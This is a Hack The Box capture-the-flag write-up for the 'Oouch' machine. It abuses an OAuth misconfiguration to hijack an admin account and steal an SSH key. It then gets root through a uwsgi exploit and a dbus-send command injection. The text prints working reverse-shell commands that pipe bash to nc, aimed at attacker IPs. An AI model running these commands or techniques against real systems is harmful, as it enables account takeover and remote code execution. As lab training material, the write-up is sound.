---
title: "[HTB] Oouch WriteUp"
date: 2020-08-01T12:00:00-00:00
categories:
  - Hack The Box
excerpt: "Oouch is a hard machine on Hack the Box, the foothold requires exploiting a misconfiguration in Oauth, then exploiting dbus to gain root access."
header:
  teaser: "/assets/oouch/oouch.jpg"
tags:
  - HTB
  - Hack The Box
  - Oouch
  - Oauth
  - WriteUp
  - Linux
---

![Oouch]({{ site.url }}{{ site.baseurl }}/assets/oouch/oouch.jpg)

Oouch is a hard machine on Hack the Box, the foothold requires exploiting a misconfiguration in Oauth, then exploiting dbus to gain root access.

I begin as always with an nmap scan.

```
# Nmap 7.80 scan initiated Fri Jul  3 20:07:53 2020 as: nmap -sC -sV -oN scans/nmap 10.10.10.177
WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.10.177
Host is up (0.030s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.53
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  3 20:08:14 2020 -- 1 IP address (1 host up) scanned in 20.59 seconds

```

The FTP server allows for anonymous login. The banner says "qtc's development server", and it contains a single text file project.txt.

```
Flask -> Consumer
Django -> Authorization Server
```

There is an http server on port 5000 with a login page. I make an account and log in with credentials xaero:xaero.

![Login Page]({{ site.url }}{{ site.baseurl }}/assets/oouch/login1.jpg)

After looking around the application I notice a few interesting points, The about page contains a subtle clue about how to exploit the application. ` If you notice bugs inside the application or the authentication flow, please inform our system administrator.` And the contact page has a message box which appears to send directly to an admin account. To test this I can send a link to my machine and listen with nc, I get a response from the server which confirms that the server is processing these messages.

![Contact Page]({{ site.url }}{{ site.baseurl }}/assets/oouch/contact.jpg)

Next I run dirbuster.

```bash
gobuster dir -u http://10.10.10.177:5000/ -w /opt/SecLists/Discovery/Web-Content/big.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.177:5000/
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/03 20:47:51 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
===============================================================
2020/07/03 20:49:23 Finished
===============================================================

```

We get a /oauth page which gives us a new subdomain http://consumer.oouch.htb:5000/.
Logging in here takes us to another subdomain, http://authorization.oouch.htb:8000/.

Register on port 8000.

To exploit the authorization flow we need to extract the token-code before it is used, as it can only be used once. To do this use Burp Suite and forward packets during the authorization until you reach the packet that contains the token-code, then copy the token and drop the packet.

```
GET /oauth/connect/token?code=FdpuhkBq86DxiKLEsvwcZI2hgDC2ld HTTP/1.1
Host: consumer.oouch.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Connection: close
Cookie: session=.eJxlj8FuAyEMRH-FcI4qwCyYfEXVHnqoosiASVbZZKtl9xTl3-u2x55GlufZMw99ahP1C3d9-HxotYroG_dOZ9Z7_ToxdVbTfFbjXa2zolJkqdbL2NWXeF708bn_z73xeezrQus439X79gu1bdqpD57KfGNFvMw7YY97CbBwv-jDumws01j1QWduQByThZitcxbBpJTIYIjmRzh5zmEYvIcIPlhTXS4JjDcuWyEx4kC1JI8mVWjFmhTIyTFHYABDQA9cRKutKDim2CrEGJJtWDJJhdKXdlrnK98lDzUvX9tA0GrJrQaPkBHJOB4GE2ICzA7QC7d1Xv5KOP38BnkSaI0.Xv-ZjQ.akKbed49LVvPMe5CbzI2QuO9eOE
Upgrade-Insecure-Requests: 1
```

Now that we have a token which has not yet been used, we can use the token with any user. So if we send the link `http://consumer.oouch.htb:5000/oauth/connect/token?code=FdpuhkBq86DxiKLEsvwcZI2hgDC2ld` to the admin via the contact page. And if the admin user "clicks" on the link which we established earlier will happen, this will link the token to the admins account. 

After the link is clicked we can log in again via port 8000 and we will be logged in as the user that is linked to our authorization account, which is now the user qtc.

![Logged in as qtc]({{ site.url }}{{ site.baseurl }}/assets/oouch/qtclogin.jpg)

We can now look around the application as the user qtc. Under Documents we find some credentials.

```
dev_access.txt:
develop:supermegasecureklarabubu123! -> Allows application registration.


o_auth_notes.txt:
/api/get_user -> user data. oauth/authorize -> Now also supports GET method.


todo.txt:
Chris mentioned all users could obtain my ssh key. Must be a joke...
```

If we navigate to authorization.oouch.htb:8000/oauth/authorize we can log in with the credentials in dev_access.txt.

This takes us to a page that allows us to register a new application. So I register a new application, making a note of the clientID and Client Secret.

```
ClientId: raJLWuJstNTX1etAwn64hSg2BiVYyI7LGMVBJ4Xk

Client Secret: exo6Yrof5DE14jc4jmdYM3aJE22UlEQqZuwFY2DTYg2JWef4qRUCc2caLianx5GOOaF0NDnJfIUJvAfiXpuamxMv7Tn4BBvseBhx5GNV9w7se45oSa3xpDe2LA7GiirO
```

I set Client type to public and authorization grant type to Authorization Code, and the redirect url to my ip, http://10.10.14.53:9001.

We can the send the following link via the contact page.

```
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=raJLWuJstNTX1etAwn64hSg2BiVYyI7LGMVBJ4Xk&redirect_uri=http://10.10.14.53:9001&grant_type=authorization_code&client_secret=exo6Yrof5DE14jc4jmdYM3aJE22UlEQqZuwFY2DTYg2JWef4qRUCc2caLianx5GOOaF0NDnJfIUJvAfiXpuamxMv7Tn4BBvseBhx5GNV9w7se45oSa3xpDe2LA7GiirO
```

Listening on port 9001 with nc, we get a cookie!

```bash
listening on [any] 9001 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.177] 47610
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
Host: 10.10.14.53:9001
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=fi4v1qnvk1knx2e6xwc39h0k4xn553pp;
```

We can continue the authorization process:

```bash
curl -X POST 'http://authorization.oouch.htb:8000/oauth/token/' -H "Content-Type: application/x-www-form-urlencoded" --data "grant_type=client_credentials&client_id=raJLWuJstNTX1etAwn64hSg2BiVYyI7LGMVBJ4Xk&client_secret=exo6Yrof5DE14jc4jmdYM3aJE22UlEQqZuwFY2DTYg2JWef4qRUCc2caLianx5GOOaF0NDnJfIUJvAfiXpuamxMv7Tn4BBvseBhx5GNV9w7se45oSa3xpDe2LA7GiirO" -L -s
```

And we get back an access token.

```
{"access_token": "s4nQEuR9zdEjuwYSev1ujxTpWTcx23", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
```

We can now use this access token to call get_ssh from the api.

```bash
http://authorization.oouch.htb:8000/api/get_ssh/?access_token=s4nQEuR9zdEjuwYSev1ujxTpWTcx23
```

Which returns the SSH key for qtc.

![SSH as qtc]({{ site.url }}{{ site.baseurl }}/assets/oouch/qtcssh.jpg)

### Privilege Escalation 

linpeas.sh doesn't return any useful information, although we do see that docker is running. 

There is a hidden file in qtc's home folder called .note.txt:

```
Implementing an IPS using DBus and iptables == Genius?
```

running `ip add` we see a number of interfaces

```bash
...
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:8f:65:6f:0b brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:10:1f:7a:9e brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:10ff:fe1f:7a9e/64 scope link 
       valid_lft forever preferred_lft forever
...
```

We can SSH into the docker container as qtc. (I tried a number of IPs before it worked, you could write a script to ping IP addresses but I didn't)

```bash
ssh -i .ssh/id_rsa qtc@172.18.0.3
```

There is an interesting directory /code. It contains the code for the application running on port 5000.

Based on the note and poking around in the code directory we figure that we can exploit dbus to get root, however we cannot run dbus-send as the current user since dbus is owned by root. 

We can begin by exploiting the uwsgi service.

We can get the version number:

```bash
uwsgi --version

2.0.17.1
```

Using this information we can find this [exploit](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py
).

The sz function requires a small change 

```py
def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = bytes.fromhex(s) 
    return s[::-1]
```

First we need to transfer uwsgi_exp.py and nc to /tmp in the docker container, then run

```bash
python ./uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c "/tmp/nc -e /bin/bash 172.18.0.1 1234"
```

We listen on oouch as qtc and get a shell as user www-data, this user can run dbus-send.

We can now use dbus send to get a shell as root, listening on port 9002 on the attacking machine run:

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "/bin/bash -i 2>&1 | nc 10.10.14.53 9002 >/tmp/.0;"
```

```bash
root@oouch:/root# cat root.txt
```